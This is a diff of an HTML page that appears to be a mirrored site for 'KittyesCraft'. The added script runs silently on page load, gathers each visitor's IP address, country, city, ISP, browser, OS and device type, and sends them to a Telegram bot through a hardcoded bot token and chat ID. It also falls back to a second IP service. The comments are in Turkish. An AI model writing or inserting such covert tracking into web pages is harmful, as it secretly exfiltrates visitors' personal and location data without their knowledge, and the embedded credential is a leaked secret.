@@ -586,31 +586,103 @@
             setTimeout(() => createSnowflake(), i * 150);
         }
  <script>
-// Bilgilerini buraya gir
-const botToken = "8621272611:AAHGwvGZA8w8CII84sgs7XCqhCqNfhKQvFw";
-const chatId = "1504410647";
+// Bilgileri buraya gir - AMA TOKEN'I GİZLİ TUT!
+const botToken = "8621272611:AAHGwvGZA8w8CII84sgs7XCqhCqNfhKQvFw"; // Token'ı gizli bir dosyada saklayın
+const chatId = "1504410647"; // Chat ID'niz
 
-fetch('https://ipapi.co/json/')
-  .then(response => response.json())
-  .then(data => {
-    // Görseldeki formata benzer mesaj yapısı
-    const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
-                    `🌐 <b>IP:</b> ${data.ip}\n` +
-                    `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
-                    `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
-                    `🚀 <b>Tarayıcı:</b> Google Chrome\n` +
-                    `✅ 💻 <b>Gerçek Bilgisayar</b>`;
+// Hata yakalama ve timeout ekleyelim
+Promise.race([
+    fetch('https://ipapi.co/json/'),
+    new Promise((_, reject) => 
+        setTimeout(() => reject(new Error('Timeout')), 5000)
+    )
+])
+.then(response => {
+    if (!response.ok) {
+        throw new Error('IP API hatası');
+    }
+    return response.json();
+})
+.then(data => {
+    // Tarayıcı bilgisini al
+    const userAgent = navigator.userAgent;
+    const browser = getBrowserInfo(userAgent);
     
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ 
-        chat_id: chatId, 
-        text: message,
-        parse_mode: 'HTML'
-      })
+    const message = `<b>🟢 Kittyscraft Giriş Yapıldı</b>\n\n` +
+        `<b>🌐 IP:</b> ${data.ip || 'Bilinmiyor'}\n` +
+        `<b>📍 Konum:</b> ${data.country_name || '?'} / ${data.city || '?'}\n` +
+        `<b>🏙️ Şehir:</b> ${data.city || '?'}\n` +
+        `<b>📡 ISP:</b> ${data.org || '?'}\n` +
+        `<b>⏰ Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+        `<b>🖥️ Tarayıcı:</b> ${browser}\n` +
+        `<b>💻 İşletim Sistemi:</b> ${getOS(userAgent)}\n` +
+        `<b>📱 Cihaz:</b> ${isMobile() ? 'Mobil' : 'Masaüstü'}`;
+
+    return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        })
     });
-  });
+})
+.then(response => response.json())
+.then(data => {
+    console.log('Bildirim gönderildi:', data);
+})
+.catch(error => {
+    console.error('Hata:', error);
+    // Alternatif IP servisi dene
+    getBackupIPInfo();
+});
+
+// Tarayıcı bilgisini al
+function getBrowserInfo(ua) {
+    if (ua.includes('Chrome')) return 'Google Chrome';
+    if (ua.includes('Firefox')) return 'Mozilla Firefox';
+    if (ua.includes('Safari')) return 'Safari';
+    if (ua.includes('Edge')) return 'Microsoft Edge';
+    return 'Bilinmiyor';
+}
+
+// İşletim sistemini al
+function getOS(ua) {
+    if (ua.includes('Windows')) return 'Windows';
+    if (ua.includes('Mac')) return 'macOS';
+    if (ua.includes('Linux')) return 'Linux';
+    if (ua.includes('Android')) return 'Android';
+    if (ua.includes('iOS')) return 'iOS';
+    return 'Bilinmiyor';
+}
+
+// Mobil kontrolü
+function isMobile() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+}
+
+// Yedek IP servisi
+function getBackupIPInfo() {
+    fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(data => {
+        const message = `<b>⚠️ Sadece IP Alınabildi</b>\n\n` +
+            `<b>IP:</b> ${data.ip}\n` +
+            `<b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}`;
+        
+        return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+    })
+    .catch(e => console.error('Yedek IP servisi de çalışmadı:', e));
+}
 </script>
 </body>
 
@@ -618,6 +690,7 @@ fetch('https://ipapi.co/json/')
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
